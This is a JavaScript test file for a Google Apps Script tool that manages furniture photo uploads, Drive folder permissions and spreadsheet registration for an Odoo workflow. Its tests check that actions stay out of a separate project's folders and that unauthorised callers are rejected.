  const regMadera = postAction(env, { action: 'odoo_register_foto', ...OWNER_AUTH, tipo: 'MADERA', nombre: 'MAD1.jpg', link: 'https://drive.google.com/file/d/w1/view' });
  const regSwatch = postAction(env, { action: 'odoo_register_foto', ...OWNER_AUTH, tipo: 'SWATCH', nombre: 'SW1.jpg', link: 'https://drive.google.com/file/d/s1/view' });
  assert.equal(regTela.fotosNormalizadas.nameCol + '/' + regTela.fotosNormalizadas.linkCol, 'F/H');
  assert.equal(regMadera.fotosNormalizadas.nameCol + '/' + regMadera.fotosNormalizadas.linkCol, 'J/L');
  assert.equal(regSwatch.fotosNormalizadas.nameCol + '/' + regSwatch.fotosNormalizadas.linkCol, 'N/P');

  // Row 3 formulas on BOTH sheets completely untouched
  assert.deepEqual(shNorm.getRange(3, 1, 1, 16).getValues()[0], normRow3Before);
  assert.deepEqual(shDg.getRange(3, 1, 1, 52).getValues()[0], dgRow3Before);
});

test('Project B: prompts_repair_permissions updates ONLY Project B folders and NEVER touches SUBIR PREN', () => {
  const env = setupProjectBEnv({ buzonTrashed: true });
  const res = postAction(env, { action: 'prompts_repair_permissions', ...OWNER_AUTH });

  assert.equal(res.ok, true);
  assert.ok(res.updatedFiles >= 3);
  assert.equal(res.skippedTrashed.length, 1);
  assert.equal(res.skippedTrashed[0].id, IDS.BUZON_ODOO);

  assert.deepEqual(env.filesById.get('propt_camastro')._state.sharing, {
    access: 'ANYONE_WITH_LINK',
    perm: 'VIEW'
  });

  assert.equal(env.foldersById.get(IDS.SUBIR_PREN)._state.sharing, null);
  assert.equal(env.filesById.get('proj_a_pren_file')._state.sharing, null);
  assert.ok(!env.accessedFolderIds.includes(IDS.SUBIR_PREN));
  assert.ok(!env.openedSpreadsheetIds.includes(IDS.SHEET_CONTROL));
});

test('Project B (Item 8): onOpen registers PUBLIC menu callbacks (no trailing _), menuConfigurePromptsPin saves PROMPTS_PIN, and menuRepairPromptsPermissions works with PROMPTS_PIN set', () => {
  const env = setupProjectBEnv({ promptsPin: TEST_PROMPTS_PIN });
  env.context.onOpen();
  assert.equal(env.createdMenus.length, 1);
  assert.equal(env.createdMenus[0].title, 'CREATA Prompts & Odoo');

  const fnNames = env.createdMenus[0].items.map((it) => it.fnName);
  assert.deepEqual(fnNames, [
    'menuPromptsHealthCheck',
    'menuPublishPromptsWebAppUrl',
    'menuConfigurePromptsPin',
    'menuRepairPromptsPermissions'
  ]);
  for (const fn of fnNames) {
    assert.ok(!fn.endsWith('_'), `Menu callback must be public (no trailing _): ${fn}`);
    assert.equal(typeof env.context[fn], 'function', `Menu callback must exist as global function: ${fn}`);
  }

  // menuRepairPromptsPermissions succeeds even when PROMPTS_PIN is configured!
  env.context.menuRepairPromptsPermissions();
  assert.ok(env.uiAlerts.length >= 1);
  const repairAlert = env.uiAlerts[env.uiAlerts.length - 1];
  assert.match(repairAlert.title, /Permisos reparados/i);
  assert.ok(!/PIN inválido/i.test(repairAlert.msg));

  // menuConfigurePromptsPin rejects <4 chars and saves valid PIN to ScriptProperties
  env.promptResponses.push({ button: 'OK', text: '12' });
  env.context.menuConfigurePromptsPin();
  assert.equal(env.scriptProps.get('PROMPTS_PIN'), TEST_PROMPTS_PIN);

  env.promptResponses.push({ button: 'OK', text: 'NEW_SECRET_2026' });
  env.context.menuConfigurePromptsPin();
  assert.equal(env.scriptProps.get('PROMPTS_PIN'), 'NEW_SECRET_2026');

  // savePromptsWebAppUrlToConfig_ registers hidden _PROMPTS_CONFIG tab cleanly
  const saved = env.context.savePromptsWebAppUrlToConfig_('https://script.google.com/macros/s/AKfycbTEST12345/exec');
  assert.equal(saved.ok, true);
  assert.equal(saved.tabName, '_PROMPTS_CONFIG');
  const cfgSh = env.spreadsheetsById.get(IDS.PROMPTS_SHEET).getSheetByName('_PROMPTS_CONFIG');
  assert.ok(cfgSh);
  assert.equal(cfgSh._isHidden(), true);
  assert.equal(cfgSh.getRange(2, 2).getValue(), 'https://script.google.com/macros/s/AKfycbTEST12345/exec');
});

test('Project B (Generic Odoo + Sheet Upload): odoo_direct_upload_and_register uploads straight to Fotos Odoo subfolder and registers in FOTOS NORMALIZADAS & DATOS GENERAL without touching Project A or Row-3 formulas', () => {
  const env = setupProjectBEnv({ buzonTrashed: false });

  const uploadRes = postAction(env, {
    ...OWNER_AUTH,
    action: 'odoo_direct_upload_and_register',
    fileName: 'HAK1PLUMNASS8_34_DERECHA.jpg',
    dataUrl: SAMPLE_JPEG_DATA_URL,
    dest: 'final',
    subfolderKey: 'MUEBLES',
    tipo: 'MUEBLE',
    registerSheet: true,
    sku: 'HAK1PLUMNASS8'
  });

  assert.equal(uploadRes.ok, true);
  assert.equal(uploadRes.destFolderKey, 'MUEBLES');
  assert.equal(uploadRes.folderId, IDS.ODOO_MUEBLES);
  assert.ok(uploadRes.file && uploadRes.file.id);
  assert.ok(uploadRes.sheetRegistration && uploadRes.sheetRegistration.ok);
  assert.ok(uploadRes.sheetRegistration.fotosNormalizadas);
  assert.ok(uploadRes.sheetRegistration.datosGeneral);
  assert.equal(uploadRes.sheetRegistration.datosGeneral.row, 4);

  const listRes = postAction(env, {
    ...OWNER_AUTH,
    action: 'odoo_final_list',
    subfolderKey: 'MUEBLES'
  });
  assert.equal(listRes.ok, true);
  assert.equal(listRes.folderId, IDS.ODOO_MUEBLES);
  assert.ok(listRes.files.some((f) => f.id === uploadRes.file.id));

  // Project A folders & Control de Productos remain 100% untouched, and Row-3 formulas remain intact
  const ss = env.spreadsheetsById.get(IDS.PROMPTS_SHEET);
  const dgSh = ss.getSheetByName('DATOS GENERAL');
  const fnSh = ss.getSheetByName('FOTOS NORMALIZADAS');
  assert.match(String(dgSh.getRange(3, 28).getValue()), /^=MAP/);
  assert.match(String(fnSh.getRange(3, 3).getValue()), /^=MAP/);
  assert.ok(!env.accessedFolderIds.includes(IDS.SUBIR_PREN));
  assert.ok(!env.openedSpreadsheetIds.includes(IDS.SHEET_CONTROL));
});

function addSourceFolders(env) {
  // I:\Mi unidad\PROYECTOS FINALES\PLANTILLAS\PRESENTACION\FOTOS SM S MUEBLERIA
  env.makeFolder('src_pf', 'PROYECTOS FINALES');
  env.makeFolder('src_pl', 'PLANTILLAS', { parentId: 'src_pf' });
  env.makeFolder('src_pr', 'PRESENTACION', { parentId: 'src_pl' });
  env.makeFolder('src_sm', 'FOTOS SM S MUEBLERIA', { parentId: 'src_pr' });
  env.makeFolder('src_sm_sub', 'Salas', { parentId: 'src_sm' });
  env.makeFile('sm_a', 'SALA_A.jpg', { parentId: 'src_sm', updatedAt: new Date('2026-11-10T10:00:00Z') });
  env.makeFile('sm_b', 'SALA_B.png', { parentId: 'src_sm_sub', mimeType: 'image/png', updatedAt: new Date('2026-11-12T10:00:00Z') });
  env.makeFile('sm_doc', 'notas.pdf', { parentId: 'src_sm', mimeType: 'application/pdf' });
  // I:\Mi unidad\DOC ANIPA\Fotos general\Informacion de fotos\Cotizacipón (typo del usuario)
  env.makeFolder('src_da', 'DOC ANIPA');
  env.makeFolder('src_fg', 'Fotos general', { parentId: 'src_da' });
  env.makeFolder('src_if', 'Información de fotos', { parentId: 'src_fg' });
  env.makeFolder('src_cot', 'Cotizacipón', { parentId: 'src_if' });
  env.makeFile('cot_a', 'COT_1.jpg', { parentId: 'src_cot' });
}

test('Project B (Fuentes de fotos): prompts_sources_list resolves SM S MUEBLERIA / Cotización(typo) by name path, lists images recursively and read-only, and SUBIR PROPT by ID', () => {
  const env = setupProjectBEnv();
  addSourceFolders(env);

  const sm = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SM_MUEBLERIA' });
  assert.equal(sm.ok, true, JSON.stringify(sm));
  assert.equal(sm.folderId, 'src_sm');
  assert.equal(sm.readOnly, true);
  assert.deepEqual(sm.files.map((f) => f.id), ['sm_b', 'sm_a']); // más reciente primero, sin PDF
  assert.equal(sm.files[0].subfolder, 'Salas');
  assert.equal(sm.sources.length, 3);

  const cot = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'cotizacion' });
  assert.equal(cot.ok, true, JSON.stringify(cot));
  assert.equal(cot.folderId, 'src_cot');
  assert.equal(cot.count, 1);

  const propt = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SUBIR_PROPT' });
  assert.equal(propt.ok, true);
  assert.equal(propt.folderId, IDS.SUBIR_PROPT);
  assert.ok(propt.files.some((f) => f.id === 'propt_camastro'));

  // Solo lectura: nada se modificó ni se creó
  assert.equal(env.filesById.get('sm_a')._state.trashed, false);
  assert.equal(env.foldersById.get('src_sm')._state.fileIds.size, 2 /* sm_a + sm_doc */);

  // Segunda llamada usa el ID cacheado (sin volver a buscar por nombre)
  const again = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SM_MUEBLERIA' });
  assert.equal(again.ok, true);
  assert.equal(again.folderId, 'src_sm');
});

test('Project B (Fuentes de fotos): rejects unauthorized callers, unknown sources, missing folders (clear message), and any folder inside Project A (fail closed)', () => {
  const env = setupProjectBEnv();

  const noPin = postAction(env, { action: 'prompts_sources_list', ownerEmail: OWNER_AUTH.ownerEmail, pin: 'bad', sourceKey: 'SM_MUEBLERIA' });
  assert.equal(noPin.ok, false);

  const unknown = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SUBIR_PREN' });
  assert.equal(unknown.ok, false);

  const missing = postAction(env, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SM_MUEBLERIA' });
  assert.equal(missing.ok, false);
  assert.equal(missing.found, false);
  assert.match(missing.error, /No encontré la carpeta SM S Mueblería/);

  // Si la carpeta resuelta vive dentro de una carpeta de Proyecto A => bloqueada
  const envA = setupProjectBEnv();
  envA.makeFolder('src_pf', 'PROYECTOS FINALES', { parentId: IDS.SUBIR_PREN });
  envA.makeFolder('src_pl', 'PLANTILLAS', { parentId: 'src_pf' });
  envA.makeFolder('src_pr', 'PRESENTACION', { parentId: 'src_pl' });
  envA.makeFolder('src_sm', 'FOTOS SM S MUEBLERIA', { parentId: 'src_pr' });
  envA.makeFile('sm_a', 'SALA_A.jpg', { parentId: 'src_sm' });
  const blocked = postAction(envA, { action: 'prompts_sources_list', ...OWNER_AUTH, sourceKey: 'SM_MUEBLERIA' });
  assert.equal(blocked.ok, false);
  assert.match(blocked.error, /Proyecto A/);
  assert.equal(blocked.files, undefined);
});
